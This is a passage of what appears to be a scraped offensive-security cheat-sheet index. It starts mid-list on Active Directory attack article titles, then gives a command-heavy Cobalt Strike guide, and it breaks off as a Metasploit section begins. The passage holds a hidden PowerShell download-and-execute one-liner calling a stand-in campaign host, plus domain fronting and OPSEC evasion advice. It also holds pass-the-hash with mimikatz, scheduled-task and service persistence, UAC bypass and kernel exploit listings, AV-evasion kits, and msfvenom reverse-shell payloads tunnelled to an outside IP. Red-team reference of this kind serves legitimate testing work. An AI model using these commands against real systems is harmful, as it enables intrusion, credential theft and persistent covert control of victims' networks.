Part 1 - Mubix \u201cRob\u201d Fuller</li> <li>Passing the hash with native RDP client (mstsc.exe)</li> <li>Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</li> <li>Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</li> <li>Pen Testing Active Directory Environments - Part III:  Chasing Power Users</li> <li>Pen Testing Active Directory Environments - Part IV: Graph Fun</li> <li>Pen Testing Active Directory Environments - Part V: Admins and Graphs</li> <li>Pen Testing Active Directory Environments - Part VI: The Final Case</li> <li>Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</li> <li>Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</li> <li>Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</li> <li>Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</li> <li>Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</li> <li>Roasting AS-REPs - January 17, 2017 - harmj0y</li> <li>Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</li> <li>Using bloodhound to map the user network - Hausec</li> <li>WHAT\u2019S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 1</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 2</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 3</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 4</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 5</li> <li>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</li> <li>A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019</li> <li>[PrivExchange] From user to domain admin in less than 60sec ! - davy</li> <li>Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</li> <li>Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P\u00c9REZ</li> <li>Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf</li> <li>All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</li> <li>Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</li> <li>Playing with Relayed Credentials - June 27, 2018</li> <li>Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</li> <li>Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</li> <li>How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</li> <li>SMB Share \u2013 SCF File Attacks - December 13, 2017 - @netbiosX</li> <li>Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</li> <li>A Red Teamer\u2019s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</li> <li>Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</li> <li>Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</li> <li>Active-Directory-Exploitation-Cheat-Sheet - @buftas</li> <li>GPO Abuse - Part 1 - RastaMouse - 6 January 2019</li> <li>GPO Abuse - Part 2 - RastaMouse - 13 January 2019</li> <li>Abusing GPO Permissions - harmj0y - March 17, 2016</li> <li>How To Attack Kerberos 101 - m0chan - July 31, 2019</li> <li>ACE to RCE - @JustinPerdok - July 24, 2020</li> <li>Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</li> <li>Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</li> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Practical Exploitation - Jake Karnes - December 8th, 2020</li> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Theory - Jake Karnes - December 8th, 2020</li> <li>Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</li> <li>GPO Abuse: \"You can't see me\" - Huy Kha -  July 19, 2019</li> <li>Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</li> <li>New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</li> <li>Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell</li> <li>AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</li> <li>Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17</li> <li>Playing with PrintNightmare - 0xdf - Jul 8, 2021</li> <li>Attacking Active Directory: 0 to 0.9 - Eloy P\u00e9rez Gonz\u00e1lez - 2021/05/29</li> <li>Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</li> <li>Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</li> <li>NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</li> <li>Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</li> <li>Certified Pre-Owned - Will Schroeder - Jun 17 2021</li> <li>AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</li> <li>NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021</li> <li>UnPAC the hash - The Hacker Recipes</li> <li>Lateral Movement \u2013 WebClient</li> <li>Shadow Credentials: Workstation Takeover Edition - Matthew Creel</li> <li>Certificate templates - The Hacker Recipes</li> <li>CA configuration - The Hacker Recipes</li> <li>Access controls - The Hacker Recipes</li> <li>Web endpoints - The Hacker Recipes</li> <li>sAMAccountName spoofing - The Hacker Recipes</li> <li>CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph</li> <li>ADCS: Playing with ESC4 - Matthew Creel</li> <li>The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</li> <li>AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</li> <li>AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh</li> <li>Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022</li> <li>Introducing MalSCCM - Phil Keeble -May 4, 2022</li> <li>Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak</li> <li>bloodyAD and CVE-2022-26923 - soka - 11 May 2022</li> <li>DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe</li> <li>How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal</li> <li>Shadow Credentials - The Hacker Recipes</li> <li>Network Access Accounts are evil\u2026 - ROGER ZANDER - 13 SEP 2015</li> <li>The Phantom Credentials of SCCM: Why the NAA Won\u2019t Die - Duane Michael - Jun 28</li> <li>Diamond tickets - The Hacker Recipes</li> <li>A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022</li> <li>Sapphire tickets - The Hacker Recipes</li> <li>Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022</li> <li>Exploring SCCM by Unobfuscating Network Access Accounts - @xpn - Posted on 2022-07-09</li> <li>.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive</li> <li>Practical guide for Golden SAML - Practical guide step by step to create golden SAML</li> <li>Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</li> <li>I AM AD FS AND SO CAN YOU - Douglas Bienstock &amp; Austin Baker - Mandiant</li> <li>Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022</li> <li>Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022</li> <li>Poc\u2019ing Beyond Domain Admin - Part 1 - cube0x0</li> <li>At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir</li> <li>Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf</li> <li>The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</li> <li>Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023</li> <li>TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort</li> <li>Beyond LLMNR/NBNS Spoofing \u2013 Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson</li> <li>ADIDNS Revisited \u2013 WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson</li> <li>Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema</li> <li>S4U2self abuse - TheHackerRecipes</li> <li>Abusing Kerberos S4U2self for local privilege escalation - cfalta</li> <li>External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)</li> <li>Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022</li> </ul>"},{"location":"command-control/cobalt-strike/","title":"Cobalt Strike","text":"<p>Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install openjdk-11-jdk\n$ sudo apt install proxychains socat\n$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64\n$ sudo ./teamserver 10.10.10.10 \"password\" [malleable C2 profile]\n$ ./cobaltstrike\n$ powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))\" \n</code></pre>"},{"location":"command-control/cobalt-strike/#summary","title":"Summary","text":"<ul> <li>Infrastructure<ul> <li>Redirectors</li> <li>Domain fronting</li> </ul> </li> <li>OpSec<ul> <li>Customer ID</li> </ul> </li> <li>Payloads<ul> <li>DNS Beacon</li> <li>SMB Beacon</li> <li>Metasploit compatibility</li> <li>Custom Payloads</li> </ul> </li> <li>Malleable C2</li> <li>Files</li> <li>Powershell and .NET<ul> <li>Powershell commabds</li> <li>.NET remote execution</li> </ul> </li> <li>Lateral Movement</li> <li>VPN &amp; Pivots</li> <li>Kits<ul> <li>Elevate Kit</li> <li>Persistence Kit</li> <li>Resource Kit</li> <li>Artifact Kit</li> <li>Mimikatz Kit</li> <li>Sleep Mask Kit</li> <li>Thread Stack Spoofer</li> </ul> </li> <li>Beacon Object Files</li> <li>NTLM Relaying via Cobalt Strike</li> <li>References</li> </ul>"},{"location":"command-control/cobalt-strike/#infrastructure","title":"Infrastructure","text":""},{"location":"command-control/cobalt-strike/#redirectors","title":"Redirectors","text":"<pre><code>sudo apt install socat\nsocat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80\n</code></pre>"},{"location":"command-control/cobalt-strike/#domain-fronting","title":"Domain Fronting","text":"<ul> <li>New Listener &gt; HTTP Host Header</li> <li>Choose a domain in \"Finance &amp; Healthcare\" sector </li> </ul>"},{"location":"command-control/cobalt-strike/#opsec","title":"OpSec","text":"<p>Don't * Use default self-signed HTTPS certificate * Use default port (50050) * Use 0.0.0.0 DNS response * Metasploit compatibility, ask for a payload : <code>wget -U \"Internet Explorer\" http://127.0.0.1/vl6D</code></p> <p>Do * Use a redirector (Apache, CDN, ...) * Firewall to only accept HTTP/S from the redirectors * Firewall 50050 and access via SSH tunnel * Edit default HTTP 404 page and Content type: text/plain * No staging <code>set hosts_stage</code> to <code>false</code> in Malleable C2 * Use Malleable Profile to taylor your attack to specific actors</p>"},{"location":"command-control/cobalt-strike/#customer-id","title":"Customer ID","text":"<p>The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike. * The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later. * The trial has a Customer ID value of 0.  * Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool</p>"},{"location":"command-control/cobalt-strike/#payloads","title":"Payloads","text":""},{"location":"command-control/cobalt-strike/#dns-beacon","title":"DNS Beacon","text":"<ul> <li>Edit the Zone File for the domain</li> <li>Create an A record for Cobalt Strike system</li> <li>Create an NS record that points to FQDN of your Cobalt Strike system</li> </ul> <p>Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.</p> <ul> <li>nslookup jibberish.beacon polling.campaigns.domain.com</li> <li>nslookup jibberish.beacon campaigns.domain.com</li> </ul> <p>Example of DNS on Digital Ocean:</p> <pre><code>NS  example.com                     directs to 10.10.10.10.            86400\nNS  polling.campaigns.example.com   directs to campaigns.example.com.   3600\nA   campaigns.example.com           directs to 10.10.10.10              3600 \n</code></pre> <pre><code>systemctl disable systemd-resolved\nsystemctl stop systemd-resolved\nrm /etc/resolv.conf\necho \"nameserver 8.8.8.8\" &gt;  /etc/resolv.conf\necho \"nameserver 8.8.4.4\" &gt;&gt;  /etc/resolv.conf\n</code></pre> <p>Configuration: 1. host: campaigns.domain.com 2. beacon: polling.campaigns.domain.com 3. Interact with a beacon, and <code>sleep 0</code></p>"},{"location":"command-control/cobalt-strike/#smb-beacon","title":"SMB Beacon","text":"<pre><code>link [host] [pipename]\nconnect [host] [port]\nunlink [host] [PID]\njump [exec] [host] [pipe]\n</code></pre> <p>SMB Beacon uses Named Pipes. You might encounter these error code while running it.</p> Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don't have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there."},{"location":"command-control/cobalt-strike/#ssh-beacon","title":"SSH Beacon","text":"<pre><code># deploy a beacon\nbeacon&gt; help ssh\nUse: ssh [target:port] [user] [pass]\nSpawn an SSH client and attempt to login to the specified target\nbeacon&gt; help ssh-key\nUse: ssh [target:port] [user] [/path/to/key.pem]\nSpawn an SSH client and attempt to login to the specified target\n# beacon's commands\nupload                    Upload a file\ndownload                  Download a file\nsocks                     Start SOCKS4a server to relay traffic\nsudo                      Run a command via sudo\nrportfwd                  Setup a reverse port forward\nshell                     Execute a command via the shell\n</code></pre>"},{"location":"command-control/cobalt-strike/#metasploit-compatibility","title":"Metasploit compatibility","text":"<ul> <li>Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https</li> <li>Set LHOST and LPORT to the beacon</li> <li>Set DisablePayloadHandler to True</li> <li>Set PrependMigrate to True</li> <li>exploit -j</li> </ul>"},{"location":"command-control/cobalt-strike/#custom-payloads","title":"Custom Payloads","text":"<p>https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</p> <pre><code>* Attacks &gt; Packages &gt; Payload Generator \n* Attacks &gt; Packages &gt; Scripted Web Delivery (S)\n$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor\n$ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml\n$ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml\n</code></pre>"},{"location":"command-control/cobalt-strike/#malleable-c2","title":"Malleable C2","text":"<p>List of Malleable Profiles hosted on Github * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles * SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint</p> <p>Example of syntax</p> <pre><code>set useragent \"SOME AGENT\"; # GOOD\nset useragent 'SOME AGENT'; # BAD\nprepend \"This is an example;\";\n# Escape Double quotes\nappend \"here is \\\"some\\\" stuff\";\n# Escape Backslashes\nappend \"more \\\\ stuff\";\n# Some special characters do not need escaping\nprepend \"!@#$%^&amp;*()\";\n</code></pre> <p>Check a profile with <code>./c2lint</code>. * A result of 0 is returned if c2lint completes with no errors * A result of 1 is returned if c2lint completes with only warnings * A result of 2 is returned if c2lint completes with only errors * A result of 3 is returned if c2lint completes with both errors and warning</p>"},{"location":"command-control/cobalt-strike/#files","title":"Files","text":"<pre><code># List the file on the specified directory\nbeacon &gt; ls &lt;C:\\Path&gt;\n# Change into the specified working directory\nbeacon &gt; cd [directory]\n# Delete a file\\folder\nbeacon &gt; rm [file\\folder]\n# File copy\nbeacon &gt; cp [src] [dest]\n# Download a file from the path on the Beacon host\nbeacon &gt; download [C:\\filePath]\n# Lists downloads in progress\nbeacon &gt; downloads\n# Cancel a download currently in progress\nbeacon &gt; cancel [*file*]\n# Upload a file from the attacker to the current Beacon host\nbeacon &gt; upload [/path/to/file]\n</code></pre>"},{"location":"command-control/cobalt-strike/#powershell-and-net","title":"Powershell and .NET","text":""},{"location":"command-control/cobalt-strike/#powershell-commands","title":"Powershell commands","text":"<pre><code># Import a Powershell .ps1 script from the control server and save it in memory in Beacon\nbeacon &gt; powershell-import [/path/to/script.ps1]\n# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.\nbeacon &gt; powershell [commandlet][arguments]\n# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto\nbeacon &gt; powerpick [commandlet] [argument]\n# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs\nbeacon &gt; psinject [pid][arch] [commandlet] [arguments]\n</code></pre>"},{"location":"command-control/cobalt-strike/#net-remote-execution","title":".NET remote execution","text":"<p>Run a local .NET executable as a Beacon post-exploitation job. </p> <p>Require: * Binaries compiled with the \"Any CPU\" configuration.</p> <pre><code>beacon &gt; execute-assembly [/path/to/script.exe] [arguments]\nbeacon &gt; execute-assembly /home/audit/Rubeus.exe\n[*] Tasked beacon to run .NET program: Rubeus.exe\n[+] host called home, sent: 318507 bytes\n[+] received output:\n   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n  v1.4.2 \n</code></pre>"},{"location":"command-control/cobalt-strike/#lateral-movement","title":"Lateral Movement","text":"<p> OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe </p> <ul> <li>portscan: Performs a portscan on a specific target.</li> <li>runas: A wrapper of runas.exe, using credentials you can run a command as another user.</li> <li>pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \\  This module needs Administrator privileges.</li> <li>steal_token: Steal a token from a specified process.</li> <li>make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.</li> <li>jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \\  The jump module will use the current delegation/impersonation token to authenticate on the remote target. \\  We can combine the jump module with the make_token or pth module for a quick \"jump\" to another target on the network.</li> <li>remote-exec: Execute a command on a remote target using psexec, winrm or wmi. \\  The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target.</li> <li>ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts.</li> </ul> <p> All the commands launch powershell.exe</p> <pre><code>Beacon Remote Exploits\n======================\njump [module] [target] [listener] \n    psexec  x86 Use a service to run a Service EXE artifact\n    psexec64    x64 Use a service to run a Service EXE artifact\n    psexec_psh  x86 Use a service to run a PowerShell one-liner\n    winrm   x86 Run a PowerShell script via WinRM\n    winrm64 x64 Run a PowerShell script via WinRM\nBeacon Remote Execute Methods\n=============================\nremote-exec [module] [target] [command] \n    Methods                         Description\n    -------                         -----------\n    psexec                          Remote execute via Service Control Manager\n    winrm                           Remote execute via WinRM (PowerShell)\n    wmi                             Remote execute via WMI (PowerShell)\n</code></pre> <p>Opsec safe Pass-the-Hash: 1. <code>mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\"powershell -w hidden\"</code> 2. <code>steal_token PID</code></p>"},{"location":"command-control/cobalt-strike/#assume-control-of-artifact","title":"Assume Control of Artifact","text":"<ul> <li>Use <code>link</code> to connect to SMB Beacon</li> <li>Use <code>connect</code> to connect to TCP Beacon</li> </ul>"},{"location":"command-control/cobalt-strike/#vpn-pivots","title":"VPN &amp; Pivots","text":"<p> Covert VPN doesn't work with W10, and requires Administrator access to deploy.</p> <p>Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. <pre><code># Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.\nbeacon &gt; socks [PORT]\nbeacon &gt; socks [port]\nbeacon &gt; socks [port] [socks4]\nbeacon &gt; socks [port] [socks5]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]\n# Proxy browser traffic through a specified Internet Explorer process.\nbeacon &gt; browserpivot [pid] [x86|x64]\n# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.\nbeacon &gt; rportfwd [bind port] [forward host] [forward port]\n# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin\nbeacon&gt; spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin\n# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller\n# then you can handle the connect back on your MSF multi handler\nbeacon&gt; spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin\n</code></pre></p>"},{"location":"command-control/cobalt-strike/#kits","title":"Kits","text":"<ul> <li>Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike</li> </ul>"},{"location":"command-control/cobalt-strike/#elevate-kit","title":"Elevate Kit","text":"<p>UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)</p> <pre><code>beacon&gt; runasadmin\nBeacon Command Elevators\n========================\n    Exploit                         Description\n    -------                         -----------\n    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)\n    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)\n    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)\n    svc-exe                         Get SYSTEM via an executable run as a service\n    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)\n    uac-token-duplication           Bypass UAC with Token Duplication\n</code></pre>"},{"location":"command-control/cobalt-strike/#persistence-kit","title":"Persistence Kit","text":"<ul> <li>https://github.com/0xthirteen/MoveKit</li> <li>https://github.com/fireeye/SharPersist     <pre><code># List persistences\nSharPersist -t schtaskbackdoor -m list\nSharPersist -t startupfolder -m list\nSharPersist -t schtask -m list\n# Add a persistence\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\nSharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\nSharPersist -t service -n \"Some Service\" -m remove\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\nSharPersist -t schtask -n \"Some Task\" -m remove\n</code></pre></li> </ul>"},{"location":"command-control/cobalt-strike/#resource-kit","title":"Resource Kit","text":"<p>The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows</p>"},{"location":"command-control/cobalt-strike/#artifact-kit","title":"Artifact Kit","text":"<p>Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique's folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :</p> <ul> <li>Download the artifact kit : <code>Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)</code></li> <li>Install the dependencies : <code>sudo apt-get install mingw-w64</code></li> <li>Edit the Artifact code<ul> <li>Change pipename strings</li> <li>Change <code>VirtualAlloc</code> in <code>patch.c</code>/<code>patch.exe</code>, e.g: HeapAlloc</li> <li>Change Import</li> </ul> </li> <li>Build the Artifact</li> <li>Cobalt Strike -&gt; Script Manager &gt; Load .cna</li> </ul>"},{"location":"command-control/cobalt-strike/#mimikatz-kit","title":"Mimikatz Kit","text":"<ul> <li>Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)</li> <li>Load the mimikatz.cna aggressor script</li> <li>Use mimikatz functions as normal</li> </ul>"},{"location":"command-control/cobalt-strike/#sleep-mask-kit","title":"Sleep Mask Kit","text":"<p>The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping. Use the included <code>build.sh</code> or <code>build.bat</code> script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.</p>"},{"location":"command-control/cobalt-strike/#thread-stack-spoofer","title":"Thread Stack Spoofer","text":"<p>An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory. Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option <code>artifactkit_stack_spoof</code> in the config file <code>arsenal_kit.config</code>.</p>"},{"location":"command-control/cobalt-strike/#beacon-object-files","title":"Beacon Object Files","text":"<p>A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h</p> <ul> <li>Compile     <pre><code># To compile this with Visual Studio:\ncl.exe /c /GS- hello.c /Fohello.o\n# To compile this with x86 MinGW:\ni686-w64-mingw32-gcc -c hello.c -o hello.o\n# To compile this with x64 MinGW:\nx86_64-w64-mingw32-gcc -c hello.c -o hello.o\n</code></pre></li> <li>Execute: <code>inline-execute /path/to/hello.o</code></li> </ul>"},{"location":"command-control/cobalt-strike/#ntlm-relaying-via-cobalt-strike","title":"NTLM Relaying via Cobalt Strike","text":"<pre><code>beacon&gt; socks 1080\nkali&gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://&lt;IP_TARGET&gt;\nbeacon&gt; rportfwd_local 8445 &lt;IP_KALI&gt; 445\nbeacon&gt; upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon&gt; PortBender redirect 445 8445\n</code></pre>"},{"location":"command-control/cobalt-strike/#references","title":"References","text":"<ul> <li>Red Team Ops with Cobalt Strike (1 of 9): Operations</li> <li>Red Team Ops with Cobalt Strike (2 of 9): Infrastructure</li> <li>Red Team Ops with Cobalt Strike (3 of 9): C2</li> <li>Red Team Ops with Cobalt Strike (4 of 9): Weaponization</li> <li>Red Team Ops with Cobalt Strike (5 of 9): Initial Access</li> <li>Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation</li> <li>Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation</li> <li>Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement</li> <li>Red Team Ops with Cobalt Strike (9 of 9): Pivoting</li> <li>A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 </li> <li>Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019</li> <li>TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE \u2013 UB 2018 - NOV 25 2018</li> <li>Cobalt Strike - DNS Beacon</li> <li>How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017</li> <li>NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse</li> <li>Cobalt Strike - User Guide</li> <li>Cobalt Strike 4.6 - User Guide PDF</li> </ul>"},{"location":"command-control/metasploit/","title":"Metasploit","text":""},{"location":"command-control/metasploit/#summary","title":"Summary","text":"<ul> <li>Installation</li> <li>Sessions</li> <li>Background handler</li> <li>Meterpreter - Basic<ul> <li>Generate a meterpreter</li> <li>Meterpreter Webdelivery</li> <li>Get System</li> <li>Persistence Startup</li> <li>Network Monitoring</li> <li>Portforward</li> <li>Upload / Download</li> <li>Execute from Memory</li> <li>Mimikatz</li> <li>Pass the Hash - PSExec</li> <li>Use SOCKS Proxy</li> </ul> </li> <li>Scripting Metasploit</li> <li>Multiple transports</li> <li>Best of - Exploits</li> <li>References</li> </ul>"},{"location":"command-control/metasploit/#installation","title":"Installation","text":"<pre><code>curl 